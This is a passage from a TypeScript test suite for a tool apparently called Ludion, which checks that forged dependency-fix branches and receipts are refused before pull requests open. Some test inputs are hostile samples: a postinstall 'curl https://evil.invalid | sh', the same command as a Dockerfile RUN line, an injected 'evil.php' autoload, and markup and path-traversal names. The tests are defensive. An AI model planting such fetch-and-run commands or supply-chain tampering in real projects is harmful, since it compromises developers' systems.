      const base = git(p.work, "rev-parse", "HEAD"), branch = fixBranchName("", "npm", "node-fetch", ["2.6.7"]), fixedPkg = changedManifest(p.work, "npm", [change]);
      const made = forge(p.work, branch, base, { "package.json": fixedPkg, "package-lock.json": lock }, { subject: "ludion: node-fetch 2.6.1 -> 2.6.7 (npm)" });
      const receipt = receiptFor(base, made) as { fixes: Record<string, unknown>[] };
      Object.assign(receipt.fixes[0]!, { package: "node-fetch", branch, changes: [change], files: [{ path: "package.json", before_hash: sha256(pkg), after_hash: sha256(fixedPkg) }, { path: "package-lock.json", before_hash: sha256(before), after_hash: sha256(lock) }] });
      receipt.fixes.pop();
      // The registry's node-fetch 2.6.7. Every other name is unknown to it: an entry whose flags alone changed declares
      // what the base's did, so it is not asked for (a "registry lists no" would refuse it).
      const asked: string[] = [];
      const npmManifest = async (name: string, version: string) => { asked.push(`${name}@${version}`); return name === "node-fetch" && version === "2.6.7" ? { name, version, dependencies: { "whatwg-url": "^5.0.0" }, peerDependencies: { encoding: "^0.1.0" }, peerDependenciesMeta: { encoding: { optional: true } } } : null; };
      const gh = github(p.origin);
      const result = await open(checkout(p.origin), artifact(p.work, receipt, [`refs/heads/${branch}`], base), base, p.origin, gh, "refs/heads/main", { npmManifest });
      expect(result.deliveries, v).toMatchObject([{ package: "node-fetch", branch, outcome: "opened" }]);
      expect(asked, v).toEqual(["node-fetch@2.6.7"]);
      expect(gh.opened, v).toHaveLength(1);
    }
  });
  it("a transitive npm fix as patch makes it is opened", async () => {
    const p = project(), s = minimistFix(p, { ...MKDIRP, "node_modules/minimist": { version: "1.2.6" } }), gh = github(p.origin);
    const result = await open(checkout(p.origin), artifact(p.work, s.receipt, s.refs, s.base), s.base, p.origin, gh);
    expect(result.deliveries).toMatchObject([{ package: "minimist", branch: s.branch, outcome: "opened" }]);
  });
  it("forged transitive npm fixes (review 6518582507, B1 and N-a)", async () => {
    const { "node_modules/minimist": _gone, ...withoutMinimist } = MKDIRP;
    const stray = { "node_modules/mkdirp/node_modules/is-number": { version: "7.0.0" } };
    for (const [packages, why] of [
      // B1: the top-level minimist removed, a key npm installs nothing at, and an unrequired lodash for the judge to fix.
      [{ ...withoutMinimist, "aaaaaaaaaaaaminimist": { version: "1.2.6" }, "node_modules/mkdirp/node_modules/lodash": { version: "4.17.21" }, ...stray }, "node_modules/mkdirp requires minimist ^1.2.5, and npm finds no copy of it in the lock"],
      // N-a (a): the real move, and a package nothing requires.
      [{ ...MKDIRP, "node_modules/minimist": { version: "1.2.6" }, ...stray }, "adds node_modules/mkdirp/node_modules/is-number, which no package the fix moves or adds requires"],
      // N-a (b): the top-level minimist removed, 1.2.6 only under mkdirp, and the same package.
      [{ ...withoutMinimist, "node_modules/mkdirp/node_modules/minimist": { version: "1.2.6" }, ...stray }, "does not have minimist at 1.2.6, the fix's version, at node_modules/minimist"],
      // N-a (c): an alias of another package at 1.2.6 in minimist's place.
      [{ ...MKDIRP, "node_modules/minimist": { name: "is-number", version: "1.2.6" } }, "node_modules/mkdirp requires minimist ^1.2.5, and node_modules/minimist has is-number@1.2.6, which is not that"],
    ] as const) await refused(p => minimistFix(p, packages), why);
  });
  it("a lockfile whose npm 6 tree installs another tarball, a lockfileVersion changed, and a base with npm-shrinkwrap.json (review of aa5d75b, B1)", async () => {
    const LEFT_PAD = { resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz", integrity: "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT3bFlCBy/aVx2HrNcqQGsdot8ghrjyrvMCoEA==" };
    const v2 = (tree: Record<string, unknown>) => `${JSON.stringify({ name: "app", lockfileVersion: 2, packages: { "node_modules/lodash": { version: "4.17.21" } }, dependencies: tree }, null, 2)}\n`;
    for (const [lock, why] of [
      // The review's attack: packages moves lodash as planned; the tree npm 6 installs from gives another tarball.
      [v2({ lodash: { version: "4.17.21", ...LEFT_PAD } }), "package-lock.json is not one Ludion reads (package-lock.json's packages and its npm 6 dependencies tree disagree at node_modules/lodash"],
      // Both views agree, but the base was v3: npm 6 would now read a tree the base never had.
      [v2({ lodash: { version: "4.17.21" } }), "package-lock.json changes its top-level lockfileVersion"],
      // The review of 1e6f705: the tree's lodash requires left-pad from a URL, which npm 6 `install` adds.
      [v2({ lodash: { version: "4.17.21", requires: { "left-pad": LEFT_PAD.resolved } } }), "disagree at node_modules/lodash"],
      // And a tree added to a v3 base that agrees with packages: npm 6 would install from a tree the base never had.
      [`${JSON.stringify({ name: "app", lockfileVersion: 3, packages: { "node_modules/lodash": { version: "4.17.21" } }, dependencies: { lodash: { version: "4.17.21" } } }, null, 2)}\n`, "package-lock.json adds the npm 6 dependencies tree"],
    ] as const) {
      await refused(p => {
        const made = forge(p.work, BRANCH, p.base, { "package-lock.json": lock });
        return { receipt: receiptFor(p.base, made, lock), refs: [`refs/heads/${BRANCH}`] };
      }, why);
    }
    await refused(p => {
      writeFileSync(join(p.work, "npm-shrinkwrap.json"), LOCK);
      git(p.work, "add", "npm-shrinkwrap.json"); git(p.work, "commit", "-qm", "shrinkwrap"); git(p.work, "push", "-q", p.origin, "HEAD:refs/heads/main");
      const base = git(p.work, "rev-parse", "HEAD"), made = forge(p.work, BRANCH, base, { "package-lock.json": FIXED });
      return { receipt: receiptFor(base, made), refs: [`refs/heads/${BRANCH}`], base };
    }, "the base has npm-shrinkwrap.json, which npm reads instead of package-lock.json");
  });
  it("reads one version's manifest from the registry, by the package's name only", async () => {
    const urls: string[] = [];
    const answer = (body: unknown) => (async (url: string | URL | Request) => { urls.push(String(url)); return new Response(JSON.stringify(body), { status: 200 }); }) as typeof fetch;
    expect(await registryManifest("@scope/pkg", "1.0.0", answer({ versions: { "1.0.0": { dependencies: { a: "1" } } } }))).toEqual({ dependencies: { a: "1" } });
    expect(urls).toEqual(["https://registry.npmjs.org/@scope%2Fpkg"]);
    expect(await registryManifest("pkg", "2.0.0", answer({ versions: { "1.0.0": {} } }))).toBeNull();
    expect(await registryManifest("pkg", "constructor", answer({ versions: {} }))).toBeNull();
    await expect(registryManifest("pkg", "1.0.0", answer({ versions: { "1.0.0": "x" } }))).rejects.toThrow("Invalid registry manifest for pkg@1.0.0");
    await expect(registryManifest("pkg", "1.0.0", answer({}))).rejects.toThrow("Invalid registry document for pkg");
  });
  it("npm: a moved or added entry must declare what the registry lists (review of 7d25696, B1 (A))", async () => {
    const forged = { ...MKDIRP, "node_modules/minimist": { version: "1.2.6", dependencies: { "is-number": "^7.0.0" } }, "node_modules/is-number": { version: "7.0.0" } };
    // The registry's minimist 1.2.6 requires nothing: the lock's own "dependencies" cannot make is-number required.
    const asked: string[] = [];
    const registry = (requires: Record<string, string>) => async (name: string, version: string) => { asked.push(`${name}@${version}`); return name === "minimist" ? { name, version, dependencies: requires } : { name, version }; };
    for (const [manifest, outcome, why] of [
      [registry({}), "failed", "package-lock.json's dependencies for minimist@1.2.6 (node_modules/minimist) is not what the registry lists"],
      [async () => null, "failed", "the registry lists no minimist@1.2.6"],
      [async () => { throw new Error("registry.npmjs.org answered HTTP 503."); }, "failed", "the registry could not be read: registry.npmjs.org answered HTTP 503."],
      [async (name: string, version: string) => ({ name, version, dependencies: name === "minimist" ? { "is-number": "^7.0.0" } : {}, os: ["linux"] }), "failed", "package-lock.json's os for"],
      // libc decides, like os and cpu, whether npm installs a package on a platform (review 6529858505, N1).
      [async (name: string, version: string) => ({ name, version, dependencies: name === "minimist" ? { "is-number": "^7.0.0" } : {}, libc: ["musl"] }), "failed", "package-lock.json's libc for"],
      // Which peers are optional: a mark the registry does not list would take a peer out of the requirement check
      // (review 6533374683, N1).
      [async (name: string, version: string) => ({ name, version, dependencies: name === "minimist" ? { "is-number": "^7.0.0" } : {}, peerDependenciesMeta: { react: { optional: true } } }), "failed", "package-lock.json's peerDependenciesMeta for"],
      // The same lock, when the registry does list the requirement: opened.
      [registry({ "is-number": "^7.0.0" }), "opened", undefined],
    ] as const) {
      const p = project(), s = minimistFix(p, forged), gh = github(p.origin);
      const result = await open(checkout(p.origin), artifact(p.work, s.receipt, s.refs, s.base), s.base, p.origin, gh, "refs/heads/main", { npmManifest: manifest });
      expect(result.deliveries[0]).toMatchObject({ outcome, ...(why ? { reason: expect.stringContaining(why) } : {}) });
      expect(branchAt(p.origin, s.branch) === "").toBe(outcome !== "opened");
      expect(gh.opened).toHaveLength(outcome === "opened" ? 1 : 0);
    }
    expect(asked).toContain("minimist@1.2.6");
    expect(asked).toContain("is-number@7.0.0");
    expect(asked).not.toContain("mkdirp@0.5.5");
  });
  it("npm: a moved entry's forged optional or peer dependency is refused too (review of 6521445720 and 1e6f705, N1)", async () => {
    // Each makes the walk reach a stray is-number as the forged "dependencies" did; the registry's 1.2.6 lists neither.
    for (const [group, why] of [["optionalDependencies", "package-lock.json's dependencies for minimist@1.2.6"], ["peerDependencies", "package-lock.json's peerDependencies for minimist@1.2.6"]] as const) {
      const p = project(), s = minimistFix(p, { ...MKDIRP, "node_modules/minimist": { version: "1.2.6", [group]: { "is-number": "^7.0.0" } }, "node_modules/is-number": { version: "7.0.0" } }), gh = github(p.origin);
      const result = await open(checkout(p.origin), artifact(p.work, s.receipt, s.refs, s.base), s.base, p.origin, gh);
      expect(result.deliveries[0], group).toMatchObject({ outcome: "failed", reason: expect.stringContaining(why) });
      expect(gh.opened, group).toHaveLength(0);
    }
  });
  it("a file outside the plan, beside the planned ones", () => refused(p => {
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED, "README.md": "changed\n" });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "not exactly package-lock.json, package.json"));
  it("a receipt that lists a file a fix may not change", async () => {
    for (const [path, why] of [["README.md", "which a npm fix may not change"], [".github/workflows/x.yml", "A file's path is missing or not in the expected form"]] as const) {
      await refused(p => {
        const made = forge(p.work, BRANCH, p.base, { [path]: "on: push\n" });
        const receipt = receiptFor(p.base, made) as { fixes: { files: unknown[] }[] };
        receipt.fixes[0]!.files = [{ path, before_hash: "0".repeat(64), after_hash: sha256("on: push\n") }];
        return { receipt, refs: [`refs/heads/${BRANCH}`] };
      }, why);
    }
  });
  it("a new file, even at a planned path", () => refused(p => {
    git(p.work, "rm", "-q", "package.json"); git(p.work, "commit", "-qm", "no package.json"); git(p.work, "push", "-q", p.origin, "HEAD:refs/heads/main");
    const base = git(p.work, "rev-parse", "HEAD"), made = forge(p.work, BRANCH, base, { "package.json": "{}\n" });
    const receipt = receiptFor(base, made) as { fixes: { files: unknown[] }[] };
    receipt.fixes[0]!.files = [{ path: "package.json", before_hash: "0".repeat(64), after_hash: sha256("{}\n") }];
    return { receipt, refs: [`refs/heads/${BRANCH}`], base };
  }, "adds, removes or changes the mode of package.json"));
  it("a changed file mode", () => refused(p => {
    const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { mode: "100755" });
    return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
  }, "changes the mode of package-lock.json"));
  it("an extra branch in the bundle", () => refused(p => {
    const fix = applied(p.work);
    forge(p.work, "ludion/npm/evil-1.0.0", p.base, { "package-lock.json": FIXED });
    return { receipt: fix.receipt, refs: [`refs/heads/${BRANCH}`, "refs/heads/ludion/npm/evil-1.0.0"] };
  }, "not exactly the receipt's applied fixes"));
  it("a bundle commit other than the receipt's", () => refused(p => {
    applied(p.work);
    return { receipt: receiptFor(p.base, "b".repeat(40)), refs: [`refs/heads/${BRANCH}`] };
  }, "not exactly the receipt's applied fixes"));
  it("an applied fix with no bundle, and a bundle with no applied fix", async () => {
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [] }), "there is no bundle");
    await refused(p => { applied(p.work); return { receipt: null, refs: [`refs/heads/${BRANCH}`] }; }, "it has a bundle, and the receipt applies no fix");
  });
  it("a file whose bytes are not the receipt's", () => refused(p => {
    const fix = applied(p.work);
    return { receipt: receiptFor(p.base, fix.commit, "something else"), refs: [`refs/heads/${BRANCH}`] };
  }, "is not the receipt's file (after_hash)"));
  it("a subject that is not the receipt's change, an author that is not Ludion, and a message with more in it", async () => {
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { subject: "ludion: lodash 4.17.20 -> 4.17.21 (npm) @everyone" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "subject is not the receipt's change");
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { author: "Mallory" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "is not authored and committed by Ludion");
    await refused(p => {
      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { extra: "\nCloses #1\nCo-authored-by: Mallory <m@example.invalid>\n" });
      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
    }, "message is not the one Ludion writes");
  });
  it("a package.json that says more than the fix: an install script, another dependency, a looser range", async () => {
    for (const pkg of [
      "{\"name\":\"app\",\"scripts\":{\"postinstall\":\"curl https://evil.invalid | sh\"},\"dependencies\":{\"lodash\":\"4.17.21\"}}\n",
      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.21\",\"left-pad\":\"1.0.0\"}}\n",
      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"*\"}}\n",
    ]) {
      await refused(p => {
        const made = forge(p.work, BRANCH, p.base, { "package.json": pkg, "package-lock.json": FIXED });
        return { receipt: receiptFor(p.base, made, FIXED, pkg), refs: [`refs/heads/${BRANCH}`] };
      }, "package.json is not what Ludion writes for lodash 4.17.21");
    }
  });
  it("a branch name that is not the one Ludion gives the receipt's fix", () => refused(p => {
    const made = forge(p.work, "ludion/npm/lodash-9.9.9", p.base, { "package-lock.json": FIXED });
    const receipt = receiptFor(p.base, made) as { fixes: { branch: string }[] };
    receipt.fixes[0]!.branch = "ludion/npm/lodash-9.9.9";
    return { receipt, refs: ["refs/heads/ludion/npm/lodash-9.9.9"] };
  }, "is not the one Ludion names for lodash"));
  it("an npm fix applied without the judge's ready_except_build, a fix whose tests did not pass, another base", async () => {
    for (const [change, why] of [
      [(f: Record<string, unknown>, _r: Record<string, unknown>) => { f.judgement = { verdict: "wait" }; }, "without the judge's ready_except_build"],
      [(f: Record<string, unknown>, _r: Record<string, unknown>) => { f.candidate_passed = false; }, "whose tests did not pass"],
      [(_f: Record<string, unknown>, r: Record<string, unknown>) => { r.base_commit = "c".repeat(40); }, "base_commit is not the commit this run checked out"],
    ] as const) {
      await refused(p => {
        const fix = applied(p.work), receipt = fix.receipt as { fixes: Record<string, unknown>[] };
        change(receipt.fixes[0]!, receipt as unknown as Record<string, unknown>);
        return { receipt, refs: [`refs/heads/${BRANCH}`] };
      }, why);
    }
  });
  it("text that could become Markdown or a mention, a receipt that is not JSON, and an oversized bundle", async () => {
    await refused(p => {
      const fix = applied(p.work), receipt = fix.receipt as { fixes: { changes: { advisories: string[] }[] }[] };
      receipt.fixes[0]!.changes[0]!.advisories = ["GHSA-x`<img src=x>`"];
      return { receipt, refs: [`refs/heads/${BRANCH}`] };
    }, "An advisory is missing or not in the expected form");
    // "Fixes GH-1." in the pushed commit would link issue #1 (review 6516135819, N3).
    await refused(p => {
      const fix = applied(p.work), receipt = fix.receipt as { fixes: { changes: { advisories: string[] }[] }[] };
      receipt.fixes[0]!.changes[0]!.advisories = ["GH-1"];
      return { receipt, refs: [`refs/heads/${BRANCH}`] };
    }, "An advisory is missing or not in the expected form");
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], tamper: out => writeFileSync(join(out, "receipt.json"), "{not json") }), "receipt.json is not JSON");
    await refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], tamper: out => writeFileSync(join(out, "fixes.bundle"), Buffer.alloc(BUNDLE_LIMIT + 1)) }), "fixes.bundle is larger than");
  });
  it("a checkout that is not at the base it is given", () => refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], base: p.first }), "The checkout is not at the base"));
});

const PHP_MESSAGE = (base: string) => `ludion: PHP 8.4.26 -> 8.4.27 in ./Dockerfile\n\nOfficial PHP security releases: 8.4.27.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change, offline in Docker.\nSource Dockerfile only; production was not changed.\n`;
/** A committed project of `files` on main, pushed to a bare origin. */
function repository(files: Record<string, string>) {
  const work = mkdtempSync(join(tmpdir(), "ludion-deliver-repo-"));
  for (const [path, content] of Object.entries(files)) writeFileSync(join(work, path), content);
  const base = commit(work);
  git(work, "branch", "-M", "main");
  const origin = mkdtempSync(join(tmpdir(), "ludion-deliver-origin-"));
  git(origin, "init", "-q", "--bare");
  git(work, "push", "-q", origin, "main:refs/heads/main");
  const copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
  snapshot(work, copy);
  return { work, origin, base, gitBase: gitBase(work, copy) };
}
const composerEntry = (name: string, version: string, ref: string, extra: Record<string, unknown> = {}) => ({ name, version, dist: { type: "zip", url: `https://api.github.com/repos/${name}/zipball/${ref}`, reference: ref, shasum: "" }, type: "library", ...extra });

describe("the PR job checks what a fix pins against the official registry", { timeout: 30_000 }, () => {
  it("PHP: the digest must be the one Docker Hub gives for the tag", async () => {
    for (const [given, outcome] of [[`sha256:${"1".repeat(64)}`, "opened"], [`sha256:${"9".repeat(64)}`, "failed"]] as const) {
      const r = repository({ "ludion.security.json": `${JSON.stringify({ schema: 1, dockerfile: "./Dockerfile", test: ["php", "t.php"], timeout_seconds: 60 })}\n`, Dockerfile: "FROM php:8.4.26-cli-alpine\nWORKDIR /app\n" });
      const after = `FROM php:8.4.27-cli-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
      const made = fixBranch(r.gitBase, "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], PHP_MESSAGE(r.base));
      const receipt = {
        schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: r.base,
        scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" }, security_releases: [{ version: "8.4.27" }] }, dockerfile_after: sha256(after),
        branch: "ludion/php/8.4.27", commit: made, fix_published_at: null, found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
      };
      const tags: string[] = [], gh = github(r.origin);
      const result = await open(checkout(r.origin), artifact(r.work, receipt, ["refs/heads/ludion/php/8.4.27"], r.base), r.base, r.origin, gh, "refs/heads/main", { phpDigest: async tag => { tags.push(tag); return given; } });
      expect(tags).toEqual(["8.4.27-cli-alpine"]);
      expect(result.deliveries[0]).toMatchObject({ outcome, ...(outcome === "failed" ? { reason: expect.stringContaining("Docker Hub gives") } : {}) });
      expect(branchAt(r.origin, "ludion/php/8.4.27")).toBe(outcome === "opened" ? made : "");
    }
  });
  /** A Composer project whose fix moves symfony/http-foundation 5.4.0 -> 5.4.54 and adds symfony/polyfill-php83, which 5.4.54 requires. */
  function composerFix() {
    const a = "a".repeat(40), b = "b".repeat(40), c = "c".repeat(40), lock = (packages: unknown[]) => `${JSON.stringify({ "content-hash": "1", packages, "packages-dev": [] }, null, 4)}\n`;
    const r = repository({
      "ludion.security.json": `${JSON.stringify({ schema: 1, ecosystem: "composer", image: "composer:2", test: ["php", "t.php"], timeout_seconds: 60 })}\n`,
      "composer.json": `${JSON.stringify({ name: "app/app", require: { "symfony/http-foundation": "5.4.0" } }, null, 2)}\n`,
      "composer.lock": lock([composerEntry("symfony/deprecation-contracts", "v2.5.0", a), composerEntry("symfony/http-foundation", "v5.4.0", b)]),
    });
    const manifestDir = mkdtempSync(join(tmpdir(), "ludion-deliver-cj-"));
    writeFileSync(join(manifestDir, "composer.json"), readFileSync(join(r.work, "composer.json")));
    const change = { name: "symfony/http-foundation", from: "5.4.0", to: "5.4.54", advisories: ["GHSA-x7x7-x7x7-x7x7"] };
    const planned = composerEntry("symfony/http-foundation", "v5.4.54", c, { require: { "symfony/polyfill-php83": "^1.27" } }), added = composerEntry("symfony/polyfill-php83", "v1.31.0", c);
    const json = changedManifest(manifestDir, "composer", [change]), fixedLock = lock([composerEntry("symfony/deprecation-contracts", "v2.5.0", a), planned, added]);
    const branch = fixBranchName("", "composer", "symfony/http-foundation", ["5.4.54"]), subject = "ludion: symfony/http-foundation 5.4.0 -> 5.4.54 (composer)";
    const made = fixBranch(r.gitBase, branch, [{ path: "composer.json", content: json }, { path: "composer.lock", content: fixedLock }], `${subject}\n\nFixes GHSA-x7x7-x7x7-x7x7.\n\nLudion receipt ${ID}: the project's test passed on ${r.base.slice(0, 12)} and on this change alone, offline in Docker.\nSource dependency files only; production was not changed.\n`);
    const receipt = {
      schema: 2, id: ID, ecosystem: "composer", scope: "dependency_files_only_not_deployed", outcome: "applied", baseline_passed: true, base_commit: r.base,
      fixes: [{ package: change.name, changes: [change], outcome: "applied", branch, commit: made, candidate_passed: true, files: [{ path: "composer.json", before_hash: "", after_hash: sha256(json) }, { path: "composer.lock", before_hash: "", after_hash: sha256(fixedLock) }], fix_published_at: null, found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z" }],
    };
    return { r, branch, made, out: artifact(r.work, receipt, [`refs/heads/${branch}`], r.base), packagist: { [planned.name]: planned, [added.name]: added } as Record<string, Record<string, unknown>> };
  }
  it("Composer: each added or moved lock entry must be as Packagist lists it, and OSV must list nothing on the version moved to", async () => {
    for (const [change, outcome, why] of [
      [{}, "opened", ""],
      [{ "symfony/http-foundation": { dist: { type: "zip", url: `https://api.github.com/repos/symfony/http-foundation/zipball/${"d".repeat(40)}`, reference: "d".repeat(40), shasum: "" } } }, "failed", "dist for symfony/http-foundation@v5.4.54 is not what Packagist lists"],
      [{ "symfony/http-foundation": { autoload: { files: ["evil.php"] } } }, "failed", "autoload for symfony/http-foundation@v5.4.54 is not what Packagist lists"],
      // The added package, not only the planned one, is asked about.
      [{ "symfony/polyfill-php83": { autoload: { files: ["bootstrap.php"] } } }, "failed", "autoload for symfony/polyfill-php83@v1.31.0 is not what Packagist lists"],
      [{ osv: ["GHSA-1111-2222-3333"] }, "failed", "OSV lists GHSA-1111-2222-3333 for symfony/http-foundation@5.4.54"],
    ] as const) {
      const fix = composerFix(), asked: string[] = [], osvAsked: string[] = [], gh = github(fix.r.origin);
      const packagist = async (name: string, version: string) => { asked.push(`${name}@${version}`); return { ...fix.packagist[name], version_normalized: "x", ...(change as Record<string, unknown>)[name] as object }; };
      const osv = async (ecosystem: string, name: string, version: string) => { osvAsked.push(`${ecosystem}:${name}@${version}`); return "osv" in change ? [...change.osv] : []; };
      const result = await open(checkout(fix.r.origin), fix.out, fix.r.base, fix.r.origin, gh, "refs/heads/main", { packagist, osv });
      expect(osvAsked).toEqual(outcome === "opened" || "osv" in change ? ["Packagist:symfony/http-foundation@5.4.54"] : []);
      if (outcome === "opened") expect(asked.sort()).toEqual(["symfony/http-foundation@v5.4.54", "symfony/polyfill-php83@v1.31.0"]);
      expect(result.deliveries[0]).toMatchObject({ outcome, ...(why ? { reason: expect.stringContaining(why) } : {}) });
      expect(branchAt(fix.r.origin, fix.branch)).toBe(outcome === "opened" ? fix.made : "");
    }
  });
  it("reads Packagist only for a plain package name, and a hostile name is refused at once", async () => {
    const urls: string[] = [];
    const fetchFn = (async (url: string | URL | Request) => { urls.push(String(url)); return new Response(JSON.stringify({ minified: "composer/2.0", packages: { "symfony/http-foundation": [{ version: "v5.4.54", dist: { url: "x" } }, { version: "v5.4.53" }] } })); }) as typeof fetch;
    expect(await packagistRelease("symfony/http-foundation", "5.4.53", fetchFn)).toMatchObject({ version: "v5.4.53", dist: { url: "x" } });
    expect(await packagistRelease("symfony/http-foundation", "9.9.9", fetchFn)).toBeNull();
    expect(urls).toEqual(["https://repo.packagist.org/p2/symfony/http-foundation.json", "https://repo.packagist.org/p2/symfony/http-foundation.json"]);
    const started = performance.now();
    for (const name of [`a/${"0".repeat(200)}!`, "a b/c", "a/b?c", "../x/y", "a/b/c", `a/${"b".repeat(300)}`]) await expect(packagistRelease(name, "1.0.0", fetchFn)).rejects.toThrow("Invalid Composer package name");
    expect(performance.now() - started).toBeLessThan(1000);
    expect(urls).toHaveLength(2);
  });
  it("a branch with this fix's tree on an older base is left alone", async () => {
    const { work, origin, first, base } = project(), fix = applied(work);
    const tree = git(work, "rev-parse", `${fix.commit}^{tree}`);
    const older = spawnSync("git", ["commit-tree", tree, "-p", first, "-m", "older"], { cwd: work, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid" } }).stdout.trim();
    git(work, "push", "-q", origin, `${older}:refs/heads/${BRANCH}`);
    const gh = github(origin), result = await open(checkout(origin), artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base), base, origin, gh);
    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
    expect(branchAt(origin, BRANCH)).toBe(older);
    expect(gh.opened).toHaveLength(0);
  });
});

describe("the policy at the base decides what a fix may change, and what it may say", { timeout: 30_000 }, () => {
  it("PHP: only the Dockerfile ludion.security.json names, with the subject, message and branch patch.ts gives", () => {
    const work = mkdtempSync(join(tmpdir(), "ludion-deliver-php-"));
    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, dockerfile: "./Dockerfile", test: ["php", "tests/smoke.php"], timeout_seconds: 60 })}\n`);
    writeFileSync(join(work, "Dockerfile"), "FROM php:8.4.26-cli-alpine\nWORKDIR /app\n");
    const base = commit(work), copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
    snapshot(work, copy);
    const after = `FROM php:8.4.27-cli-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
    const made = fixBranch(gitBase(work, copy), "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], PHP_MESSAGE(base));
    const receipt = {
      schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: base,
      scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" }, security_releases: [{ version: "8.4.27", date: "23 Oct 2026" }] }, dockerfile_after: sha256(after),
      branch: "ludion/php/8.4.27", commit: made, fix_published_at: "2026-10-23T00:00:00.000Z", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
    };
    const out = artifact(work, receipt, ["refs/heads/ludion/php/8.4.27"], base);
    const checked = checkArtifact(work, out, base);
    expect(checked.fixes).toMatchObject([{ package: "php", branch: "ludion/php/8.4.27", commit: made, files: [{ path: "Dockerfile" }] }]);
    expect(pullRequestBody(checked, checked.fixes[0]!)).toContain("PHP image updates do not go through Ludion's judge");
    // The same commit under a Composer policy: the Dockerfile is not a file a Composer fix may change.
    writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "composer", image: "composer:2", test: ["php", "x"], timeout_seconds: 60 })}\n`);
    git(work, "commit", "-qam", "composer policy");
    const composerBase = git(work, "rev-parse", "HEAD");
    expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: composerBase }, [], composerBase), composerBase)).toThrow("is not a composer dependency receipt");
  });
  const fixOf = (pkg: string, from: string, to: string, files: string[]): CheckedFix => ({
    package: pkg, changes: [{ name: pkg, from, to, advisories: [] }], branch: "ludion/x", commit: "a".repeat(40), subject: "", message: "", tree: "",
    files: files.map(path => ({ path, after_hash: "" })), fix_published_at: null, found_at: "", applied_at: "", verdict: null,
  });
  const files = (map: Record<string, string>) => (path: string) => map[path] ?? null;
  it("PHP: only the FROM image may change, to the official image of a newer release, pinned by digest", () => {
    const old = "FROM php:8.4.26-cli-alpine\nWORKDIR /app\nCOPY . /app\n", fix = fixOf("php", "8.4.26", "8.4.27", ["Dockerfile"]), digest = "2".repeat(64);
    const check = (now: string, to = "8.4.27") => contentProblem("php", { ...fix, changes: [{ ...fix.changes[0]!, to }] }, files({ Dockerfile: old }), files({ Dockerfile: now }));
    expect(check(old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
    expect(check(old.replace("php:8.4.26-cli-alpine", `docker.io/library/php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
    for (const now of [
      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`) + "RUN curl https://evil.invalid | sh\n",
      old.replace("php:8.4.26-cli-alpine", `evil/php:8.4.27-cli-alpine@sha256:${digest}`),
      old.replace("php:8.4.26-cli-alpine", "php:8.4.27-cli-alpine"),
      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-fpm-alpine@sha256:${digest}`),
      old.replace("WORKDIR /app", "WORKDIR /").replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`),
    ]) expect(check(now)).toMatch(/changes more than its FROM image/);
    expect(check(old.replace("8.4.26", "8.4.25"), "8.4.25")).toMatch(/is not a newer release/);
    expect(check(old.replace("8.4.26", "8.5.0"), "8.5.0")).toMatch(/is not a newer release/);
  });
  it("Composer and Maven: the update goes up, and Composer's from is what the base locks; npm: no other package moves", () => {
    const lock = (packages: unknown[]) => JSON.stringify({ "content-hash": "1", packages, "packages-dev": [] });
    const entry = (version: string) => ({ name: "symfony/http-foundation", version, dist: { type: "zip", url: `https://api.github.com/repos/symfony/http-foundation/zipball/${"c".repeat(40)}`, reference: "c".repeat(40) }, type: "library" });
    const json = (spec: string) => JSON.stringify({ name: "app/app", require: { "symfony/http-foundation": spec } });
